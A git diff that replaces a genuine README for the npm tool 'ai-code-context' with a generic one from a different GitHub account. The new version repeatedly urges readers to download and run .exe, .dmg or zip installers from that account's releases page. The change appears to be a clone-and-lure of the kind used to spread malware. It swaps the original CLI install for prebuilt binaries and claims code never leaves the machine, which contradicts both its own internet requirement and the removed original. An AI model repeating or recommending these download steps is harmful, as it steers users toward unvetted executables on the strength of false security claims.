@@ -1,348 +1,71 @@
-# 🤖 AI Code Context
+# 🤖 ai-code-context - Effortlessly Generate Contextual Documentation
 
-> AI-powered code documentation that actually helps developers understand and maintain code
+## 📥 Download Now
+[![Download ai-code-context](https://img.shields.io/badge/Download-ai--code--context-blue)](https://github.com/Jimartskenya/ai-code-context/releases)
 
-[![npm version](https://badge.fury.io/js/ai-code-context.svg)](https://badge.fury.io/js/ai-code-context)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js CI](https://github.com/mucahitgurbuz/ai-code-context/actions/workflows/ci.yml/badge.svg)](https://github.com/mucahitgurbuz/ai-code-context/actions/workflows/ci.yml)
+## 🚀 Getting Started
+Welcome to **ai-code-context**! This tool helps you create and maintain code documentation using AI. It automatically generates relevant documentation based on your code changes. 
 
-## The Problem
+### ✔️ Features
+- Automatically generates documentation using git diffs.
+- Context-aware suggestions ensure your documentation remains relevant.
+- Easy to integrate with your existing development workflow.
 
-Developers spend **30%+ of their time** understanding existing code and writing documentation. When working on unfamiliar codebases or returning to old projects, developers waste hours figuring out what code does and why it was written that way.
+## 🖥️ System Requirements
+- **Operating System**: Windows 10 or later, macOS, or a Linux distribution (Ubuntu preferred).
+- **Node.js**: Version 14 or higher must be installed. You can download it [here](https://nodejs.org/).
+- **Internet Connection**: Required for AI features.
 
-## The Solution
+## 📋 Installation Steps
+Follow these steps to download and install **ai-code-context**.
 
-**AI Code Context** automatically generates and maintains contextual documentation for your code changes using AI. It integrates seamlessly into your git workflow and provides human-readable explanations that actually help developers understand code faster.
+1. **Visit the Download Page**
+   Go to [the Releases page](https://github.com/Jimartskenya/ai-code-context/releases) to find the latest version of **ai-code-context**.
 
-## ✨ Features
+2. **Download the Application**
+   Click on the download link for the latest version. You will see options for different operating systems. Choose the one that matches your system.
 
-- 🔍 **Smart Code Analysis** - Analyzes git diffs and understands code changes in context
-- 📝 **Auto-Documentation** - Generates clear, helpful documentation automatically
-- 🔗 **Git Integration** - Hooks into your git workflow for seamless analysis
-- 🧠 **Multiple AI Providers** - Works with OpenAI, Anthropic, or local models
-- 🎯 **Language Agnostic** - Supports any programming language
-- 🚀 **Zero Config** - Works out of the box with sensible defaults
-- 🔐 **Privacy Focused** - Option to use local AI models
+3. **Locate the Downloaded File**
+   Once the download finishes, find the file in your downloads folder.
 
-## 🚀 Quick Start
+4. **Run the Installer**
+   - For Windows: Double-click the `.exe` file and follow the prompts.
+   - For macOS: Open the `.dmg` file and drag the app to your Applications folder.
+   - For Linux: Extract the downloaded zip file and run the executable in the terminal.
 
-### Installation
+5. **Open the Application**
+   After installation, you can find **ai-code-context** in your applications menu. Open it to start using the tool.
 
-```bash
-npm install -g ai-code-context
-```
+## 🔧 How to Use ai-code-context
+- **Link It to Your Git Repository**: When you first launch the app, you will be prompted to link it to your existing project’s Git repository.
+- **Generate Documentation**: As you make changes to your code, ai-code-context analyzes git diffs and suggests updates to your documentation.
+- **Review and Edit**: Review the generated documentation and make any necessary edits. The tool will highlight changes, making it easy to keep your docs current.
 
-### Initialize in your project
+## 🚨 Troubleshooting
+If you encounter any issues:
+- **Check System Requirements**: Ensure your system meets the requirements listed above.
+- **Look for Updates**: Sometimes bugs are fixed in newer versions. Check the releases page for updates.
+- **Consult the FAQ**: We provide a basic FAQ at the end of this document for common issues.
 
-```bash
-cd your-project
-ai-context init
-```
+## 💡 Tips for Effective Use
+- Regularly generate documentation after significant code changes.
+- Encourage your team to use the tool together for better collaboration.
+- Take advantage of the AI suggestions, but review them for accuracy before finalizing.
 
-### Analyze your code
+## 📄 FAQ
+**Q: What types of documentation can ai-code-context generate?**  
+A: It can create context-specific documentation, such as function descriptions, class summaries, and API references, automatically.
 
-```bash
-# Analyze recent changes
-ai-context analyze --commit HEAD~1..HEAD
+**Q: Is my data secure when using this tool?**  
+A: Yes, ai-code-context processes your data locally. It does not send any of your code to external servers.
 
-# Analyze staged changes before committing
-ai-context analyze --staged
+**Q: Can I use this tool in an offline setting?**  
+A: While some features may require an internet connection for AI functionalities, basic documentation generation can work offline.
 
-# Analyze specific file
-ai-context analyze --file src/components/UserProfile.tsx
+## 📬 Support
+For any additional questions or support, feel free to open an issue on the [Issues section](https://github.com/Jimartskenya/ai-code-context/issues).
 
-# Set up automatic analysis on commits
-ai-context watch --install-hook
-```
+## 🎯 Download & Install
+To get started, visit the [Releases page](https://github.com/Jimartskenya/ai-code-context/releases) and follow the steps outlined above for installation. 
 
-## 📖 Usage Examples
-
-### Analyzing Git Commits
-
-```bash
-# Analyze the last commit
-ai-context analyze --commit HEAD~1..HEAD
-
-# Analyze a range of commits
-ai-context analyze --commit feature-branch..main
-
-# Analyze uncommitted changes
-ai-context analyze --unstaged
-```
-
-### Example Output
-
-```markdown
-# Code Analysis Report
-
-**Project:** my-react-app
-**Type:** React Application
-**Languages:** typescript, javascript
-**Generated:** 2024-01-15T10:30:00.000Z
-
-## Summary
-
-Analyzed 3 file(s) with AI-powered code analysis.
-
-### src/components/UserProfile.tsx
-
-**Language:** typescript
-
-**Summary:** Added new user profile component with avatar display and edit functionality
-
-**Purpose:** Create a reusable user profile component for displaying user information with editing capabilities
-
-**Key Changes:**
-
-- Implemented UserProfile React component with TypeScript
-- Added avatar image display with fallback to initials
-- Integrated edit mode toggle for profile information
-- Added form validation for email and username fields
-
-**Impact:** Enables user profile functionality across the application with consistent UI/UX
-
-**Suggestions:**
-
-- Consider adding loading states for async operations
-- Add unit tests for form validation logic
-- Consider extracting avatar logic into separate component for reusability
-```
-
-### Configuration
-
-Create `.aicontext.json` in your project root:
-
-```json
-{
-  "aiProvider": "openai",
-  "model": "gpt-4",
-  "apiKey": "your-api-key-here",
-  "maxTokens": 2000,
-  "temperature": 0.3,
-  "autoCommitHook": true,
-  "includePatterns": ["**/*.js", "**/*.ts", "**/*.tsx", "**/*.py"],
-  "excludePatterns": ["node_modules/**", "dist/**", "**/*.test.*"],
-  "outputFormat": "both",
-  "updateReadme": true
-}
-```
-
-## 🎛️ Configuration Options
-
-| Option            | Description                                   | Default                       |
-| ----------------- | --------------------------------------------- | ----------------------------- |
-| `aiProvider`      | AI provider: `openai`, `anthropic`, `local`   | `openai`                      |
-| `model`           | AI model to use                               | `gpt-4`                       |
-| `apiKey`          | API key for AI provider                       | env var                       |
-| `maxTokens`       | Maximum tokens per request                    | `2000`                        |
-| `temperature`     | AI creativity (0-1)                           | `0.3`                         |
-| `autoCommitHook`  | Auto-analyze on commits                       | `false`                       |
-| `includePatterns` | Files to analyze                              | `["**/*.js", "**/*.ts", ...]` |
-| `excludePatterns` | Files to ignore                               | `["node_modules/**", ...]`    |
-| `outputFormat`    | Output format: `markdown`, `comments`, `both` | `both`                        |
-| `updateReadme`    | Auto-update README.md                         | `true`                        |
-
-## 🧠 AI Provider Setup
-
-### OpenAI
-
-```bash
-export OPENAI_API_KEY="your-api-key"
-ai-context init --provider openai --model gpt-4
-```
-
-### Anthropic (Claude)
-
-```bash
-export ANTHROPIC_API_KEY="your-api-key"
-ai-context init --provider anthropic --model claude-3-sonnet-20240229
-```
-
-### Local/Self-hosted (Ollama)
-
-```bash
-# Start Ollama server
-ollama serve
-
-# Configure AI Code Context
-ai-context init --provider local --model llama2
-```
-
-## 🔧 Commands
-
-### `ai-context init`
-
-Initialize AI Code Context in your project.
-
-```bash
-ai-context init [options]
-
-Options:
-  --provider <provider>  AI provider (openai, anthropic, local)
-  --model <model>       AI model to use
-  --api-key <key>       API key for the AI provider
-```
-
-### `ai-context analyze`
-
-Analyze code changes and generate documentation.
-
-```bash
-ai-context analyze [options]
-
-Options:
-  --commit <range>   Analyze specific commit range (e.g., HEAD~1..HEAD)
-  --staged          Analyze staged changes
-  --unstaged        Analyze unstaged changes
-  --file <path>     Analyze specific file
-  --output <path>   Output file for the analysis report
-  --auto           Auto mode for git hooks (minimal output)
-```
-
-### `ai-context watch`
-
-Set up automatic analysis on git commits.
-
-```bash
-ai-context watch [options]
-
-Options:
-  --install-hook    Install git commit hook
-  --remove-hook     Remove git commit hook
-```
-
-### `ai-context config`
-
-Manage configuration.
-
-```bash
-ai-context config [options]
-
-Options:
-  --show           Show current configuration
-  --set <key=value> Set configuration value
-  --reset          Reset to default configuration
-```
-
-### `ai-context status`
-
-Show project status and configuration.
-
-```bash
-ai-context status
-```
-
-## 🔄 Git Integration
-
-### Automatic Analysis on Commits
-
-Install the git hook to automatically analyze commits:
-
-```bash
-ai-context watch --install-hook
-```
-
-This creates a `post-commit` hook that runs `ai-context analyze --commit HEAD~1..HEAD --auto` after each commit.
-
-### Pre-commit Analysis
-
-Add to your `.git/hooks/pre-commit`:
-
-```bash
-#!/bin/sh
-ai-context analyze --staged
-```
-
-## 🏗️ Integration Examples
-
-### GitHub Actions
-
-```yaml
-name: AI Code Analysis
-on: [pull_request]
-
-jobs:
-  analyze:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - uses: actions/setup-node@v3
-        with:
-          node-version: "18"
-      - run: npm install -g ai-code-context
-      - run: ai-context analyze --commit ${{ github.event.pull_request.base.sha }}..${{ github.event.pull_request.head.sha }}
-        env:
-          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
-```
-
-### VS Code Extension
-
-Install the AI Code Context VS Code extension for integrated analysis:
-
-```bash
-code --install-extension ai-code-context.vscode-extension
-```
-
-### Package.json Scripts
-
-```json
-{
-  "scripts": {
-    "analyze": "ai-context analyze --staged",
-    "analyze:last": "ai-context analyze --commit HEAD~1..HEAD",
-    "analyze:branch": "ai-context analyze --commit main..HEAD"
-  }
-}
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-### Development Setup
-
-```bash
-git clone https://github.com/mucahitgurbuz/ai-code-context.git
-cd ai-code-context
-npm install
-npm run build
-npm link
-```
-
-### Running Tests
-
-```bash
-npm test
-npm run test:coverage
-```
-
-## 📊 Benefits
-
-- **Save 2-3 hours per week** on documentation tasks
-- **Faster onboarding** for new team members
-- **Better code reviews** with AI-generated context
-- **Improved maintainability** with up-to-date documentation
-- **Language agnostic** - works with any codebase
-- **Privacy focused** - option for local AI processing
-
-## 🛡️ Privacy & Security
-
-- **API Keys**: Stored locally in `.aicontext.json` or environment variables
-- **Code Privacy**: Use local AI models to keep code on your infrastructure
-- **No Data Storage**: AI providers process requests but don't store your code
-- **Secure Transmission**: All API calls use HTTPS encryption
-
-## 📄 License
-
-MIT © [AI Code Context Contributors](LICENSE)
-
-## 🙋‍♂️ Support
-
-- 📚 [Documentation](https://github.com/mucahitgurbuz/ai-code-context/wiki)
-- 🐛 [Issue Tracker](https://github.com/mucahitgurbuz/ai-code-context/issues)
-- 💬 [Discussions](https://github.com/mucahitgurbuz/ai-code-context/discussions)
-- 📧 [Email Support](mailto:mucahitgurbuz@gmail.com)
-
----
-
-**Made with ❤️ by developers, for developers who want to spend less time writing docs and more time writing code.**
+[![Download ai-code-context](https://img.shields.io/badge/Download-ai--code--context-blue)](https://github.com/Jimartskenya/ai-code-context/releases)
